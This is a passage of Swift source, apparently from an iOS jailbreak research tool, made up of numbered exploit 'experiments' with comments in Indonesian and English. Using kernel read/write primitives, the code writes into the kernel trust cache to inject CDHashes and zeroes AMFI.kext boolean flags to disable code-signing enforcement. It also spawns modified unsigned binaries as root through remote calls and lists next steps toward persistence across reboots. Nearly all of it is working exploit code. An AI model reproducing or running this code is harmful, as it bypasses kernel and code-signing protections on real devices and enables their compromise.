                detail += "\u{1F3C6} COPY SPAWNED FROM SPRINGBOARD!\n"
                detail += "AMFI accept binary copy dari SB context!\n"
                detail += "FULL JAILBREAK!\n"
                RootExecutor.rcall(sb, "usleep", 300000)
                RootExecutor.rcall(sb, "kill", UInt64(pidD), 9)
            } else {
                detail += "ret=\(retD) -- masih reject dari SB juga\n"
            }
        }

        // Cleanup
        RootExecutor.rcall(sb, "unlink", symlinkPath)
        RootExecutor.rcall(sb, "free", symlinkPath)
        RootExecutor.rcall(sb, "free", amfidPath)
        RootExecutor.rcall(sb, "free", patchedPath)
        RootExecutor.rcall(sb, "free", copyPath)

        let success = detail.contains("\u{1F3C6}")
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 92: Inject CDHash into Heap Trust Cache

    /// Exp 92: Inject CDHash binary patched ke heap trust cache.
    /// Exp 81 CONFIRMED: write ke heap trust cache BERHASIL (KTRR tidak block heap).
    /// Flow:
    ///   1. Hitung CDHash dari /var/tmp/.amfid_patched (SHA256 truncated 20 bytes)
    ///   2. Cari heap trust cache (dari Exp 77/81 probe)
    ///   3. Write CDHash entry ke slot kosong di trust cache
    ///   4. Update count
    ///   5. posix_spawn /var/tmp/.amfid_patched → AMFI cek trust cache → CDHash MATCH → ALLOW!
    private func runExp92TCInject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp92_tc_inject") { rc in
            let result = self.expTCInject(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    private func expTCInject(rc: RemoteCall) -> ExperimentResult {
        let expName = "TC Inject (Exp 92)"
        var detail = "Experiment 92: Inject CDHash into Trust Cache\n"
        detail += "===============================================\n\n"

        let mem = rc.trojanMem
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff

        // === Step 1: Use probedTCAddr from Exp 77 (or find fresh) ===
        detail += "=== Step 1: Find trust cache ===\n"

        var tcAddr: UInt64 = probedTCAddr
        var tcCount: UInt32 = probedTCCount
        var tcIsHeap = false

        if tcAddr != 0 {
            detail += "Using probedTCAddr from Exp 77: 0x\(String(format: "%llx", tcAddr))\n"
            detail += "  count: \(tcCount)\n"
            tcIsHeap = isSafeKernelHeapKreadAddress(tcAddr)
            detail += "  location: \(tcIsHeap ? "HEAP (writable!)" : "__DATA (KTRR protected)")\n"
        }

        // Also scan for heap trust cache (dynamic TC might exist)
        if !tcIsHeap {
            detail += "\nScanning for HEAP trust cache (dynamic)...\n"
            let targetOffsets: [UInt64] = [0x39b0, 0x38a0, 0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770]
            for off in targetOffsets {
                let addr = dataSegBase &+ off
                let ptr = ds_kreadptr(addr)
                guard ptr != 0, isSafeKernelHeapKreadAddress(ptr) else { continue }
                let ver = safeKread32Heap(ptr)
                let cnt = safeKread32Heap(ptr &+ 4)
                if ver >= 1 && ver <= 16 && cnt >= 1 && cnt <= 500_000 {
                    tcAddr = ptr
                    tcCount = cnt
                    tcIsHeap = true
                    detail += "  Found HEAP TC at kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", ptr))\n"
                    detail += "  version=\(ver), count=\(cnt)\n"
                    break
                }
            }
        }

        if tcAddr == 0 {
            detail += "\u{274C} Trust cache tidak ditemukan. Jalankan Exp 77 dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "\nTarget TC: 0x\(String(format: "%llx", tcAddr)) (\(tcIsHeap ? "heap" : "__DATA"))\n\n"

        // === Step 2: Try write to trust cache ===
        detail += "=== Step 2: Write test ===\n"

        let stride: UInt64 = 24
        let injectSlot = tcAddr &+ 8 &+ UInt64(tcCount) * stride
        detail += "Inject slot (count=\(tcCount)): 0x\(String(format: "%llx", injectSlot))\n"

        // Read current value at inject slot
        let beforeVal: UInt64
        if tcIsHeap {
            beforeVal = safeKread64Heap(injectSlot)
        } else {
            beforeVal = safeKread64Kernel(injectSlot)
        }
        detail += "Before write: 0x\(String(format: "%016llx", beforeVal))\n"

        // Write test value
        let testVal: UInt64 = 0x4141414141414141
        ds_kwrite64(injectSlot, testVal)

        // Read back
        let afterVal: UInt64
        if tcIsHeap {
            afterVal = safeKread64Heap(injectSlot)
        } else {
            afterVal = safeKread64Kernel(injectSlot)
        }
        detail += "After write: 0x\(String(format: "%016llx", afterVal))\n"

        let writeOK = afterVal == testVal
        if writeOK {
            detail += "\u{2705} WRITE SUCCEEDED!\n\n"

            // Restore original value (don't corrupt TC yet)
            ds_kwrite64(injectSlot, beforeVal)

            // Try update count
            detail += "=== Step 3: Test count update ===\n"
            let oldCount = tcIsHeap ? safeKread32Heap(tcAddr &+ 4) : safeKread32Kernel(tcAddr &+ 4)
            ds_kwrite32(tcAddr &+ 4, oldCount + 1)
            let newCount = tcIsHeap ? safeKread32Heap(tcAddr &+ 4) : safeKread32Kernel(tcAddr &+ 4)
            detail += "Count: \(oldCount) \u{2192} \(newCount)\n"

            if newCount == oldCount + 1 {
                // Restore count
                ds_kwrite32(tcAddr &+ 4, oldCount)
                detail += "\u{2705} Count update works!\n\n"
                detail += "\u{1F3C6}\u{1F3C6}\u{1F3C6} TRUST CACHE IS WRITABLE! \u{1F3C6}\u{1F3C6}\u{1F3C6}\n\n"
                detail += "Both entry write AND count update work.\n"
                detail += "Next: compute real CDHash \u{2192} inject \u{2192} spawn \u{2192} JAILBREAK!\n\n"
                detail += "Trust cache addr: 0x\(String(format: "%llx", tcAddr))\n"
                detail += "Location: \(tcIsHeap ? "heap" : "__DATA")\n"
                detail += "Count: \(oldCount)\n"
                detail += "Stride: \(stride)\n"
            } else {
                detail += "\u{274C} Count update GAGAL (KTRR block write ke count field)\n"
                detail += "Entry write OK tapi count RO \u{2014} partial success\n"
            }
        } else {
            detail += "\u{274C} Write GAGAL \u{2014} trust cache di-protect.\n"
            detail += "Location: \(tcIsHeap ? "heap (unexpected!)" : "__DATA (KTRR expected)")\n\n"

            if !tcIsHeap {
                detail += "Trust cache di __DATA \u{2192} KTRR hardware read-only.\n"
                detail += "Tidak ada dynamic/heap trust cache di boot ini.\n"
                detail += "Untuk inject CDHash, butuh:\n"
                detail += "  1. Trigger dynamic trust cache creation (mount DDI)\n"
                detail += "  2. Atau: find different writable TC struct\n"
            }
        }

        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 93: AMFI __DATA Write Test

    /// Exp 93: Test write to AMFI.kext __DATA (fileset component).
    /// AMFI __DATA might be OUTSIDE KTRR range since it's a fileset aux component.
    /// If writable: flip boolean flags → disable AMFI checks entirely.
    private func runExp93AMFIDataWrite() {
        isRunning = true
        runningLabel = "AMFI Data"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expAMFIDataWrite()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    private func expAMFIDataWrite() -> ExperimentResult {
        let expName = "AMFI Data Write (Exp 93)"
        var detail = "Experiment 93: AMFI.kext __DATA Write Test\n"
        detail += "============================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000  // unslid __TEXT base
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // AMFI __DATA from deep_tc_analysis.py
        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
        let amfiDataSlid = amfiDataUnslid &+ slide
        let amfiDataSize: UInt64 = 0x541

        detail += "AMFI __DATA (unslid): 0x\(String(format: "%llx", amfiDataUnslid))\n"
        detail += "AMFI __DATA (slid):   0x\(String(format: "%llx", amfiDataSlid))\n"
        detail += "AMFI __DATA size:     0x\(String(format: "%llx", amfiDataSize))\n\n"

        // Step 1: Read test — confirm we can read AMFI __DATA
        detail += "=== Step 1: Read AMFI __DATA ===\n"

        let readTest = ds_kread64_safe(amfiDataSlid)
        detail += "AMFI __DATA[0]: 0x\(String(format: "%016llx", readTest))\n"

        if readTest == 0 {
            // Could be zero (valid) or could be unmapped
            let readTest2 = ds_kread64_safe(amfiDataSlid + 8)
            detail += "AMFI __DATA[8]: 0x\(String(format: "%016llx", readTest2))\n"
            if readTest2 == 0 {
                let readTest3 = ds_kread64_safe(amfiDataSlid + 0x110)
                detail += "AMFI __DATA[0x110]: 0x\(String(format: "%016llx", readTest3))\n"
                if readTest3 == 0 {
                    detail += "⚠️ All reads return 0 — might be unmapped or wrong address\n\n"
                }
            }
        }

        // Dump first 0x200 bytes
        detail += "\nAMFI __DATA dump (first 0x200 bytes):\n"
        for off: UInt64 in stride(from: 0, to: 0x200, by: 8) {
            let v = ds_kread64_safe(amfiDataSlid + off)
            if v != 0 {
                detail += "  +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", v))\n"
            }
        }
        detail += "\n"

        // Step 2: Find boolean flags (values = 1)
        detail += "=== Step 2: Find boolean flags ===\n"

        // Known flag offsets from deep_tc_analysis.py (value=1 in kernelcache)
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        var foundFlags: [(offset: UInt64, value: UInt64)] = []

        for off in flagOffsets {
            guard off < amfiDataSize else { continue }
            let v = ds_kread64_safe(amfiDataSlid + off)
            detail += "  +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", v))"
            if v == 1 {
                detail += " ← BOOL FLAG (1)\n"
                foundFlags.append((off, v))
            } else if v == 0 {
                detail += " ← zero\n"
            } else {
                detail += "\n"
            }
        }
        detail += "\nFound \(foundFlags.count) boolean flags set to 1\n\n"

        // Step 3: WRITE TEST — try to flip ONE flag (safest: pick last one)
        detail += "=== Step 3: Write test (single flag) ===\n"

        guard !foundFlags.isEmpty else {
            detail += "❌ No boolean flags found — AMFI __DATA might be at different address\n"
            detail += "Or: AMFI __DATA is not readable (wrong slide?)\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Pick the LAST flag (least likely to be critical for stability)
        let testFlag = foundFlags.last!
        let testAddr = amfiDataSlid + testFlag.offset
        detail += "Test target: AMFI __DATA+0x\(String(format: "%x", testFlag.offset))\n"
        detail += "Address: 0x\(String(format: "%llx", testAddr))\n"
        detail += "Current value: \(testFlag.value)\n"
        detail += "Writing: 0 (disable flag)\n\n"

        // Read before
        let before = ds_kread64_safe(testAddr)
        detail += "Before write: 0x\(String(format: "%016llx", before))\n"

        // Write 0 (flip flag off)
        ds_kwrite64(testAddr, 0)

        // Read after
        let after = ds_kread64_safe(testAddr)
        detail += "After write:  0x\(String(format: "%016llx", after))\n\n"

        let writeOK = (after == 0 && before == 1)

        if writeOK {
            detail += "✅✅✅ AMFI __DATA IS WRITABLE! ✅✅✅\n\n"
            detail += "AMFI.kext __DATA is NOT protected by KTRR!\n"
            detail += "We can patch ALL boolean flags to disable AMFI checks!\n\n"

            // Restore the flag for now (don't break things yet)
            ds_kwrite64(testAddr, 1)
            let restored = ds_kread64_safe(testAddr)
            detail += "Restored flag to 1: \(restored == 1 ? "OK" : "FAILED")\n\n"

            detail += "=== NEXT STEPS ===\n"
            detail += "1. Identify which flags control CDHash validation\n"
            detail += "2. Flip the right flags → AMFI stops checking signatures\n"
            detail += "3. posix_spawn unsigned binary → SUCCESS!\n\n"

            detail += "=== ALL AMFI FLAGS (for batch disable) ===\n"
            for off in flagOffsets {
                detail += "  0x\(String(format: "%llx", amfiDataSlid + off)) (+0x\(String(format: "%x", off)))\n"
            }
        } else {
            detail += "❌ Write FAILED — AMFI __DATA is also KTRR-protected.\n"
            detail += "Fileset component __DATA is within KTRR range on A12.\n\n"
            detail += "Value after write: 0x\(String(format: "%016llx", after))\n"
            detail += "Expected: 0x0000000000000000\n"
            detail += "This means KTRR covers ALL kernel segments including fileset.\n"
        }

        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93b: AMFI Flag Disable + Spawn Test

    /// Exp 93b: Flip ALL 10 AMFI boolean flags to 0, then test posix_spawn of unsigned binary.
    /// If AMFI checks are controlled by these flags, disabling them should allow unsigned exec.
    private func runExp93bAMFIFlagDisable() {
        isRunning = true
        runningLabel = "AMFI Disable"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93b_amfi_disable") { rc in
            let result = self.expAMFIFlagDisable(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expAMFIFlagDisable(rc: RemoteCall) -> ExperimentResult {
        let expName = "AMFI Flag Disable (Exp 93b)"
        var detail = "Experiment 93b: AMFI Flag Disable + Spawn Test\n"
        detail += "================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // AMFI __DATA from deep_tc_analysis.py
        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
        let amfiDataSlid = amfiDataUnslid &+ slide

        detail += "AMFI __DATA (slid): 0x\(String(format: "%llx", amfiDataSlid))\n\n"

        // All 10 boolean flags (value=1 in kernelcache, confirmed writable by Exp 93)
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]

        // Step 1: Read all flags before modification
        detail += "=== Step 1: Read current flag values ===\n"
        var originalValues: [(offset: UInt64, value: UInt64)] = []
        var allOnes = true

        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            detail += "  AMFI+0x\(String(format: "%03x", off)): \(val)"
            if val == 1 {
                detail += " ✓\n"
            } else {
                detail += " ← NOT 1 (unexpected)\n"
                allOnes = false
            }
        }
        detail += "\n"

        if !allOnes {
            detail += "⚠️ Some flags are not 1 — might already be patched or wrong offset.\n"
            detail += "Proceeding anyway (will write 0 to all).\n\n"
        }

        // Step 2: Write 0 to ALL flags (disable AMFI checks)
        detail += "=== Step 2: Disable ALL AMFI flags (write 0) ===\n"
        var writeSuccessCount = 0

        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            ds_kwrite64(addr, 0)
            let readback = ds_kread64_safe(addr)
            let ok = (readback == 0)
            if ok { writeSuccessCount += 1 }
            detail += "  AMFI+0x\(String(format: "%03x", off)): write 0 → readback=\(readback) \(ok ? "✅" : "❌")\n"
        }
        detail += "\nFlags disabled: \(writeSuccessCount)/\(flagOffsets.count)\n\n"

        guard writeSuccessCount == flagOffsets.count else {
            detail += "❌ Not all flags could be written — aborting spawn test.\n"
            // Restore what we can
            for (off, origVal) in originalValues {
                ds_kwrite64(amfiDataSlid &+ off, origVal)
            }
            detail += "Restored original values.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "✅ All 10 AMFI flags set to 0!\n\n"

        // Step 3: Test posix_spawn of system binary
        detail += "=== Step 3: posix_spawn test ===\n\n"

        let testBinaries: [(path: String, label: String)] = [
            ("/usr/bin/id", "id (system binary)"),
            ("/bin/ls", "ls (system binary)"),
        ]

        var spawnSuccess = false
        let mem = rc.trojanMem

        for (binPath, label) in testBinaries {
            detail += "--- Testing: \(label) ---\n"

            let binAddr = remote_alloc_str(rc, binPath)

            // argv = [binary, NULL]
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)

            // pid output
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)

            // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()

            detail += "  posix_spawn ret=\(ret), pid=\(pid)\n"

            if ret == 0 && pid != 0 {
                // Wait for child
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
                let exitStatus = rc[statusAddr].value32()
                let exitCode = exitStatus >> 8
                let signal = exitStatus & 0x7F

                detail += "  exit_status=0x\(String(format: "%x", exitStatus)), code=\(exitCode), signal=\(signal)\n"

                if signal == 9 {
                    detail += "  ❌ SIGKILL — AMFI still killing unsigned exec\n\n"
                } else if signal == 0 && exitCode <= 1 {
                    detail += "  ✅✅✅ SPAWN SUCCESS! No SIGKILL! ✅✅✅\n\n"
                    spawnSuccess = true
                } else {
                    detail += "  ⚠️ Exited with signal=\(signal), code=\(exitCode)\n\n"
                    if signal == 0 { spawnSuccess = true }
                }
            } else {
                let err = remote_errno(rc)
                detail += "  ❌ spawn failed: errno=\(err)\n\n"
            }

            RootExecutor.rcall(rc, "free", binAddr)

            if spawnSuccess { break }
        }

        // Step 4: Also try fork+exec pattern (in case posix_spawn has extra checks)
        if !spawnSuccess {
            detail += "--- Testing: fork + execve ---\n"

            let binAddr = remote_alloc_str(rc, "/usr/bin/id")
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)

            let childPid = RootExecutor.rcall(rc, "fork")
            detail += "  fork() = \(childPid)\n"

            if childPid == 0 {
                // We are in child — exec
                RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
                // If execve returns, it failed
                RootExecutor.rcall(rc, "_exit", 127)
            } else if childPid != UInt64(bitPattern: -1) {
                // Parent — wait
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
                let exitStatus = rc[statusAddr].value32()
                let signal = exitStatus & 0x7F
                let exitCode = exitStatus >> 8

                detail += "  child exit: status=0x\(String(format: "%x", exitStatus)), signal=\(signal), code=\(exitCode)\n"

                if signal == 9 {
                    detail += "  ❌ SIGKILL on child — AMFI enforcement still active\n\n"
                } else if signal == 0 && exitCode != 127 {
                    detail += "  ✅ execve succeeded!\n\n"
                    spawnSuccess = true
                } else {
                    detail += "  ⚠️ execve might have failed (code=\(exitCode))\n\n"
                }
            } else {
                detail += "  ❌ fork() failed\n\n"
            }

            RootExecutor.rcall(rc, "free", binAddr)
        }

        // Step 5: Restore all flags
        detail += "=== Step 5: Restore AMFI flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
            let readback = ds_kread64_safe(amfiDataSlid &+ off)
            detail += "  AMFI+0x\(String(format: "%03x", off)): restored to \(readback)\n"
        }
        detail += "\n"

        // Final verdict
        detail += "=== VERDICT ===\n\n"
        if spawnSuccess {
            detail += "🎉🎉🎉 FULL JAILBREAK ACHIEVED! 🎉🎉🎉\n\n"
            detail += "AMFI boolean flags control code signing enforcement!\n"
            detail += "Disabling all 10 flags allows unsigned binary execution!\n\n"
            detail += "=== NEXT STEPS ===\n"
            detail += "1. Binary search: find WHICH specific flag(s) are needed\n"
            detail += "2. Keep flags disabled permanently (until reboot)\n"
            detail += "3. Write custom unsigned binary and execute it\n"
            detail += "4. Build untether (persist across reboot)\n"
        } else {
            detail += "❌ Spawn still fails with AMFI flags disabled.\n\n"
            detail += "Possible reasons:\n"
            detail += "  1. These flags don't control CDHash validation\n"
            detail += "     (might be logging/telemetry flags)\n"
            detail += "  2. AMFI check happens BEFORE these flags are consulted\n"
            detail += "  3. pmap_cs (separate subsystem) also validates\n"
            detail += "  4. Trust cache lookup is in PPL, not affected by AMFI flags\n\n"
            detail += "=== ALTERNATIVE APPROACHES ===\n"
            detail += "  A. Try leaving flags disabled + inject CDHash into heap TC\n"
            detail += "  B. Binary search flags individually to find their purpose\n"
            detail += "  C. Combine with cs_enforcement_disable in main __DATA\n"
            detail += "  D. Patch proc->p_csflags via KRW (per-process bypass)\n"
        }

        return ExperimentResult(name: expName, success: spawnSuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93c: AMFI Disable + Verified Spawn + Unsigned Binary

    /// Exp 93c: Definitive test — disable AMFI flags, verify paths exist, capture stdout,
    /// AND test spawning a COPIED binary (not in trust cache = different CDHash).
    private func runExp93cVerifiedSpawn() {
        isRunning = true
        runningLabel = "AMFI Verify"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93c_verified_spawn") { rc in
            let result = self.expAMFIVerifiedSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expAMFIVerifiedSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "AMFI Verified Spawn (Exp 93c)"
        var detail = "Experiment 93c: Verified Spawn + Unsigned Binary\n"
        detail += "==================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        // ============================================================
        // Step 0: Verify binary paths via open() (access() fails in RC)
        // ============================================================
        detail += "=== Step 0: Verify paths (open test) ===\n"

        // On iOS 18, small binaries like /usr/bin/id, /bin/ls are in shared cache
        // and DON'T exist as standalone files on disk!
        // Use /usr/libexec/amfid which is proven to be openable from launchd RC.
        let testPaths = ["/usr/libexec/amfid", "/usr/bin/id", "/bin/ls", "/bin/sh"]
        var validPath: String? = nil

        for path in testPaths {
            let pathAddr = remote_alloc_str(rc, path)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_RDONLY), 0)
            if fd != UInt64(bitPattern: -1) {
                detail += "  open(\(path)): fd=\(fd) ✅\n"
                RootExecutor.rcall(rc, "close", fd)
                if validPath == nil { validPath = path }
            } else {
                detail += "  open(\(path)): FAIL ❌\n"
            }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        detail += "\n"

        guard let spawnPath = validPath else {
            detail += "❌ No openable binary found! Cannot proceed.\n"
            detail += "Falling back to fork+execve only (no copy test).\n\n"

            // Still do the flag disable + fork+execve test
            detail += "=== Fallback: Disable flags + fork+execve ===\n"
            var originalValues: [(offset: UInt64, value: UInt64)] = []
            for off in flagOffsets {
                let addr = amfiDataSlid &+ off
                let val = ds_kread64_safe(addr)
                originalValues.append((off, val))
                ds_kwrite64(addr, 0)
            }
            detail += "Flags disabled: 10/10\n\n"

            // Baseline: fork+execve trusted binary WITH flags enabled
            // (can't do baseline because flags already disabled — restore first)
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "--- [baseline] fork+execve /usr/bin/id (flags ON) ---\n"
            let bl = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
            detail += bl.log + "\n"

            // Now disable again
            for off in flagOffsets { ds_kwrite64(amfiDataSlid &+ off, 0) }
            detail += "--- [test] fork+execve /usr/bin/id (flags OFF) ---\n"
            let t1 = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
            detail += t1.log + "\n"

            // Restore
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "Flags restored.\n\n"

            detail += "=== VERDICT ===\n"
            detail += "Baseline: \(bl.success ? "✅" : "❌") (signal=\(bl.signal), code=\(bl.exitCode))\n"
            detail += "Test:     \(t1.success ? "✅" : "❌") (signal=\(t1.signal), code=\(t1.exitCode))\n\n"

            if bl.success && t1.success {
                detail += "⚠️ Both work — fork+execve trusted binary works regardless of flags.\n"
                detail += "Need unsigned binary test to confirm AMFI bypass.\n"
            } else if !bl.success && t1.success {
                detail += "🎉 Flags make a difference! Trusted binary only works with flags OFF.\n"
            } else {
                detail += "Both same result — flags don't affect fork+execve of trusted binary.\n"
            }

            return ExperimentResult(name: expName, success: t1.success && !bl.success, detail: detail, timestamp: Date())
        }
        detail += "Using: \(spawnPath)\n\n"

        // ============================================================
        // Step 1: Create unsigned binary (copy + modify = new CDHash)
        // ============================================================
        detail += "=== Step 1: Create unsigned test binary ===\n"

        let srcPathStr = spawnPath
        let dstPathStr = "/var/tmp/.exp93c_test"
        let srcPath = remote_alloc_str(rc, srcPathStr)
        let dstPath = remote_alloc_str(rc, dstPathStr)

        // Remove old copy
        RootExecutor.rcall(rc, "unlink", dstPath)

        // Open source
        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(srcPathStr)\n"
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Open dest
        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard dstFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(dstPathStr)\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Copy file
        let buf = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<512 {  // max 512 * 4096 = 2MB
            let nread = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if nread == 0 || nread == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd, buf, nread)
            totalCopied += nread
            if nread < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)

        detail += "Copied \(srcPathStr) → \(dstPathStr) (\(totalCopied) bytes)\n"

        // Patch 1 byte to invalidate CDHash (change padding byte near end of Mach-O header)
        let patchFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDWR), 0)
        if patchFd != UInt64(bitPattern: -1) {
            // Seek to offset 0x10 (padding area in mach_header_64) and flip a bit
            RootExecutor.rcall(rc, "lseek", patchFd, 0x10, 0)  // SEEK_SET
            rc[buf].setValue8(0x42)  // arbitrary byte
            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
            RootExecutor.rcall(rc, "close", patchFd)
            detail += "Patched byte at offset 0x10 → CDHash now INVALID\n"
        }

        // chmod +x
        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
        detail += "chmod 755 done\n\n"

        // Verify unsigned binary exists via open
        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
        if verifyFd != UInt64(bitPattern: -1) {
            detail += "Verify \(dstPathStr): EXISTS ✅\n\n"
            RootExecutor.rcall(rc, "close", verifyFd)
        } else {
            detail += "Verify \(dstPathStr): FAIL ❌\n\n"
        }

        // ============================================================
        // Step 2: BASELINE — fork+execve WITHOUT disabling flags
        // (posix_spawn returns ret=2 in launchd RC — use fork+execve)
        // ============================================================
        detail += "=== Step 2: Baseline (flags ENABLED) ===\n\n"

        // Test A: fork+execve original binary (trusted — should work)
        detail += "--- [baseline] fork+execve \(spawnPath) (trusted) ---\n"
        let baselineTrusted = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += baselineTrusted.log
        detail += "\n"

        // Test B: fork+execve unsigned copy (should FAIL — SIGKILL by AMFI)
        detail += "--- [baseline] fork+execve \(dstPathStr) (unsigned) ---\n"
        let baselineUnsigned = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += baselineUnsigned.log
        detail += "\n"

        // ============================================================
        // Step 3: Disable ALL AMFI flags
        // ============================================================
        detail += "=== Step 3: Disable AMFI flags ===\n"

        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }

        // Verify all disabled
        var allDisabled = true
        for off in flagOffsets {
            let readback = ds_kread64_safe(amfiDataSlid &+ off)
            if readback != 0 { allDisabled = false }
        }
        detail += "Flags disabled: \(allDisabled ? "10/10 ✅" : "PARTIAL ❌")\n\n"

        guard allDisabled else {
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "❌ Could not disable all flags\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ============================================================
        // Step 4: Test spawns WITH flags disabled
        // ============================================================
        detail += "=== Step 4: Spawn tests (flags DISABLED) ===\n\n"

        // Test A: fork+execve original (trusted) binary
